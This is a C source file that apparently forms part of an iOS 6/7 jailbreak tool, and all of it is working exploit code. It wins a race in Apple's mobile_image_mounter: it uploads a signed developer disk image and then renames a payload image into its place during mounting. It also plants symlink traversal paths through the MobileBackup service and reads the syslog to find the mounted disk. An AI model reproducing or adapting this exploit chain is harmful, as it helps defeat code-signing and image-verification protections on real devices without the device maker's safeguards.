#include "device.h"
#include "afc.h"
#include "util.h"
#include "syslog.h"
#include "backup.h"
#include "mount.h"

static volatile int target_disk = 0x1337;

void *find_target_disk(void *args) {
    syslog_info_t *syslog_info = syslog_init((am_device_t *)args);
    if (syslog_info == NULL) return NULL;

    while (1) {
        char *msg = syslog_get_message(syslog_info);
        if (msg == NULL || target_disk == 0x1337) continue;
        msg[syslog_info->size-1] = '\0';

        if (strstr(msg, "mount_attached_disk_image") != NULL) {
            char *disk = strstr(msg, "/dev/disk");
            if (disk == NULL) continue;

            target_disk = (int)(*(disk + strlen("/dev/disk"))) - 48;
            break;
        }
    }

    syslog_deinit(syslog_info);
    return NULL;
}

static int unmount_image(am_device_t *device, const char *path) {
    void *service = md_open_secure_service(device, "com.apple.mobile.mobile_image_mounter");
    if (service == NULL) return -1;

    CFStringRef cf_path = CFStringCreateWithCString(NULL, path, kCFStringEncodingUTF8);
    CFMutableDictionaryRef dict = CFDictionaryCreateMutable(NULL, 0, NULL, NULL);
    CFDictionarySetValue(dict, CFSTR("Command"), CFSTR("UnmountImage"));
    CFDictionarySetValue(dict, CFSTR("MountPath"), cf_path);

    AMDServiceConnectionSendMessage(service, dict, kCFPropertyListXMLFormat_v1_0);
    CFRelease(dict);
    CFRelease(cf_path);

    CFDictionaryRef status = NULL;
    AMDServiceConnectionReceiveMessage(service, &status, NULL);
    CFRelease(service);

    if (status == NULL) return -1;
    CFRelease(status);
    return 0;
}

void prepare_mount(mount_info_t *mount_info) {
    switch (mount_info->device_info->version[0]) {
        case 7: {
            afc_directory_t *dir = afc_open_dir(mount_info->afc_info, "PublicStaging/cache/haxx");
            if (dir != NULL) {
                char *entry = NULL;
                char full_path[1024] = {0};

                while ((entry = afc_read_dir(mount_info->afc_info, dir)) != NULL) {
                    if (entry[0] == '\0' || strcmp(entry, ".") == 0 || strcmp(entry, "..") == 0) continue;
                    memset(full_path, 0, 1024);
                    snprintf(full_path, 1024-1, "PublicStaging/cache/haxx/%s", entry);
                    afc_delete_item(mount_info->afc_info, full_path);
                }
                afc_close_dir(mount_info->afc_info, dir);
            }
        } break;

        case 6: {
            afc_delete_item(mount_info->afc_info, "PublicStaging");
            afc_create_dir(mount_info->afc_info, "PublicStaging");
        } break;

        default: {
            afc_delete_item(mount_info->afc_info, "PublicStaging/cache/haxx/developer.dimage");
            afc_delete_item(mount_info->afc_info, "PublicStaging/cache/haxx/payload.dimage");
            afc_delete_item(mount_info->afc_info, "PublicStaging/cache/haxx/old.dimage");
        } break;
    }
}

int mount_image(mount_info_t *mount_info, uint32_t delay) {
    CFMutableDictionaryRef dict = NULL;
    void *service = NULL;
    int rv = -1;

    size_t image_size = 0;
    uint8_t *image_data = (uint8_t *)load_embed_file("__stock_dmg", &image_size);
    if (image_data == NULL) return -1;

    size_t signature_size = 0;
    void *signature_data = load_embed_file("__signature", &signature_size);
    if (signature_data == NULL) return -1;

    service = md_open_secure_service(mount_info->afc_info->device, "com.apple.mobile.mobile_image_mounter");
    if (service == NULL) goto err;
    prepare_mount(mount_info);

#if defined(WINDOWS_BUILD)
    dict = CFDictionaryCreateMutable(NULL, 0, NULL, NULL);
#else
    dict = CFDictionaryCreateMutable(NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
#endif
    CFDictionarySetValue(dict, CFSTR("ImageType"), CFSTR("Developer"));

    CFDataRef cf_signature = CFDataCreate(NULL, signature_data, signature_size);
    CFDictionarySetValue(dict, CFSTR("ImageSignature"), cf_signature);
    CFRelease(cf_signature);

    switch (mount_info->device_info->version[0]) {
        case 7: {
            const char *payload_name = (target_disk == -1) ? "__payload1_7" : "__payload2_7";
            if (afc_upload_embed_file(mount_info->afc_info, payload_name, "PublicStaging/cache/haxx/payload.dimage") != 0) goto err;
            CFDictionarySetValue(dict, CFSTR("ImageSize"), CFNUM(image_size));
            CFDictionarySetValue(dict, CFSTR("Command"), CFSTR("ReceiveBytes"));
        } break;

        case 6: {
            if (afc_upload_embed_file(mount_info->afc_info, "__stock_dmg", "PublicStaging/staging.dimage") != 0) goto err;
            if (afc_upload_embed_file(mount_info->afc_info, "__payload_dmg", "PublicStaging/payload.dimage") != 0) goto err;
            CFDictionarySetValue(dict, CFSTR("ImagePath"), CFSTR("/var/mobile/Media/PublicStaging/staging.dimage"));
            CFDictionarySetValue(dict, CFSTR("Command"), CFSTR("MountImage"));
        } break;

        default: {
            if (afc_upload_embed_file(mount_info->afc_info, "__stock_dmg", "PublicStaging/cache/haxx/developer.dimage") != 0) goto err;
            if (afc_upload_embed_file(mount_info->afc_info, "__payload_dmg", "PublicStaging/cache/haxx/payload.dimage") != 0) goto err;
            CFDictionarySetValue(dict, CFSTR("ImagePath"), CFSTR("/var/mobile/Media/PublicStaging/cache/haxx/developer.dimage"));
            CFDictionarySetValue(dict, CFSTR("Command"), CFSTR("MountImage"));
        } break;
    }

    if (mount_info->device_info->version[0] == 7) {
        AMDServiceConnectionSendMessage(service, dict, kCFPropertyListXMLFormat_v1_0);
        CFDictionaryRef status = NULL;

        AMDServiceConnectionReceiveMessage(service, &status, NULL);
        if (status == NULL) goto err;

        CFStringRef status_str = CFDictionaryGetValue(status, CFSTR("Status"));
        if (status_str == NULL || !CFEqual(status_str, CFSTR("ReceiveBytesAck"))) {
            CFRelease(status);
            goto err;
        }

        CFRelease(status);
        size_t remaining_size = image_size;
        size_t offset = 0;
        status = NULL;

        while (remaining_size > 0) {
            size_t transfer_size = (remaining_size < 0x4000) ? remaining_size : 0x4000;
            int sent_size = AMDServiceConnectionSend(service, image_data + offset, transfer_size);
            if (sent_size < 0) break;

            offset += (size_t)sent_size;
            remaining_size -= (size_t)sent_size;
            if (sent_size == 0) break;
        }

        if (remaining_size != 0) goto err;
        AMDServiceConnectionReceiveMessage(service, &status, NULL);
        if (status == NULL) goto err;

        CFDictionarySetValue(dict, CFSTR("Command"), CFSTR("MountImage"));
        CFDictionarySetValue(dict, CFSTR("ImagePath"), CFSTR("/private/var/mobile/Media/PublicStaging/staging.dimage"));
        CFRelease(status);
    }

    AMDServiceConnectionSendMessage(service, dict, kCFPropertyListXMLFormat_v1_0);
    usleep(delay);

    switch (mount_info->device_info->version[0]) {
        case 7: {
            afc_directory_t *dir = afc_open_dir(mount_info->afc_info, "PublicStaging/cache/haxx");
            if (dir != NULL) {
                char *entry = NULL;
                char ddi_path[1024] = {0};
                char old_path[1024] = {0};

                while ((entry = afc_read_dir(mount_info->afc_info, dir)) != NULL) {
                    if (strstr(entry, ".dmg")) {
                        snprintf(ddi_path, 1024-1, "PublicStaging/cache/haxx/%s", entry);
                        snprintf(old_path, 1024-1, "PublicStaging/cache/haxx/old_%s", entry);

                        AFCRenamePath(mount_info->afc_info->connection, ddi_path, old_path);
                        AFCRenamePath(mount_info->afc_info->connection, "PublicStaging/cache/haxx/payload.dimage", ddi_path);
                    }
                }
                afc_close_dir(mount_info->afc_info, dir);
            }
        } break;

        case 6: {
            AFCRenamePath(mount_info->afc_info->connection, "PublicStaging/payload.dimage", "PublicStaging/staging.dimage");
        } break;

        default: {
            AFCRenamePath(mount_info->afc_info->connection, "PublicStaging/cache/haxx/developer.dimage", "PublicStaging/cache/haxx/old.dimage");
            AFCRenamePath(mount_info->afc_info->connection, "PublicStaging/cache/haxx/payload.dimage", "PublicStaging/cache/haxx/developer.dimage");
        } break;
    }

    CFDictionaryRef status = NULL;
    AMDServiceConnectionReceiveMessage(service, &status, NULL);
    if (status == NULL) goto err;

    CFStringRef status_str = CFDictionaryGetValue(status, CFSTR("Status"));
    if (status_str != NULL && CFEqual(status_str, CFSTR("Complete"))) rv = 0;
    CFRelease(status);
    
err:
    if (dict != NULL) CFRelease(dict);
    if (service != NULL) md_close_secure_service(service);
    return rv;
}

static mount_info_t *init_mount_info(am_device_t *device, device_info_t *device_info, afc_info_t *afc_info) {
    mount_info_t *mount_info = calloc(1, sizeof(mount_info_t));
    if (mount_info == NULL) return NULL;
    int status = -1;

    mount_info->device = device;
    mount_info->afc_info = afc_info;
    mount_info->device_info = device_info;

    afc_delete_item(afc_info, "PublicStaging");
    afc_create_dir(afc_info, "PublicStaging");
    afc_delete_item(afc_info, "aquila_e");
    afc_delete_item(afc_info, "aquila_m");

    unmount_image(device, "/System/Library/Caches");
    unmount_image(device, "/Developer");
    unmount_image(device, "/usr/lib");

    if (device_info->version[0] == 6) return mount_info;
    afc_create_dir(afc_info, "PublicStaging/cache/haxx");
    afc_create_dir(afc_info, "aquila_e/a/b/c");
    afc_create_dir(afc_info, "aquila_e/var/mobile/Media/PublicStaging/cache");
    afc_create_dir(afc_info, "aquila_m/a/b/c/d/e/f/g");
    afc_create_dir(afc_info, "aquila_m/private/var");

    afc_file_ref_t file = afc_create_file(afc_info, "aquila_e/var/mobile/Media/PublicStaging/cache/haxx");
    if (file == NULL) goto err;
    afc_close_file(afc_info, file);
    afc_create_symlink(afc_info, "../../../var/mobile/Media/PublicStaging/cache/haxx", "aquila_e/a/b/c/c");

    file = afc_create_file(afc_info, "aquila_m/private/var/run");
    if (file == NULL) goto err;
    afc_close_file(afc_info, file);
    afc_create_symlink(afc_info, "../../../../../../../private/var/run", "aquila_m/a/b/c/d/e/f/g/c");

    void *mb_service = mb_open_service(device);
    if (mb_service == NULL) goto err;
    if (send_backup_payload(device, mb_service) != 0) goto err;
    if (send_file_payload(device, mb_service, "Media/PhotoData/c", "/var/mobile/Media/aquila_m/a/b/c/d/e/f/g/c") != 0) goto err;
    if (send_file_payload(device, mb_service, "Media/PhotoData/c/mobile_image_mounter", "/var/mobile/Media/aquila_e/a/b/c/c") != 0) goto err;

    if (device_info->version[0] == 7) {
#if defined(WINDOWS_BUILD)
        mount_info->log_thread = CreateThread(NULL, 0, find_target_disk, (void *)device, 0, NULL);
#else
        pthread_create(&mount_info->log_thread, NULL, find_target_disk, (void *)device);
#endif
        usleep(250000);
        target_disk = -1;
    }

    usleep(100000);
    status = 0;

err:
    if (status == 0) return mount_info;
    if (mount_info != NULL) free(mount_info);
    return NULL;
}

int mount_dmg_payload(am_device_t *device, device_info_t *device_info, afc_info_t *afc_info, int *disk) {
    uint32_t upload_delay = 1000;
    bool upload_done = false;
    int upload_tries = 1;

    mount_info_t *mount_info = init_mount_info(device, device_info, afc_info);
    if (mount_info == NULL) return -1;

    if (device_info->version[0] == 7) {
        for (; upload_tries < 20; upload_tries++) {
            mount_image(mount_info, upload_delay);
            usleep(100000);
            if (target_disk != -1) break;
    
            print_log(VERBOSE, "retrying dmg payload upload (attempt #%d)\n", upload_tries);
            upload_delay += 100;
        }

        if (target_disk < 0) {
            free(mount_info);
            return -1;
        }

        usleep(1000000);
        *disk = target_disk;
        upload_delay = 1000;
        upload_tries = 1;
    }

    for (; upload_tries < 60; upload_tries++) {
        if (mount_image(mount_info, upload_delay) == 0) {
            upload_done = true;
            break;
        }

        if (device_info->version[0] == 7) {
            if (md_open_secure_service(device, "com.apple.aquila_checkin") != NULL) {
                upload_done = true;
                break;
            }
        }
      
        print_log(VERBOSE, "retrying dmg payload upload (attempt #%d)\n", upload_tries);
        upload_delay += 100;
    }

    if (device_info->version[0] == 6) {
        afc_delete_item(afc_info, "PublicStaging/stock.dimage");
        afc_delete_item(afc_info, "PublicStaging/payload.dimage");
    } else {
        afc_directory_t *dir = afc_open_dir(mount_info->afc_info, "PublicStaging/cache/haxx");
        if (dir != NULL) {
            char *entry = NULL;
            char full_path[1024] = {0};

            while ((entry = afc_read_dir(mount_info->afc_info, dir)) != NULL) {
                if (entry[0] == '\0' || strcmp(entry, ".") == 0 || strcmp(entry, "..") == 0) continue;
                memset(full_path, 0, 1024);
                snprintf(full_path, 1024-1, "PublicStaging/cache/haxx/%s", entry);
                afc_delete_item(mount_info->afc_info, full_path);
            }
            afc_close_dir(mount_info->afc_info, dir);
        }
    }
    return upload_done ? 0 : -1;
}
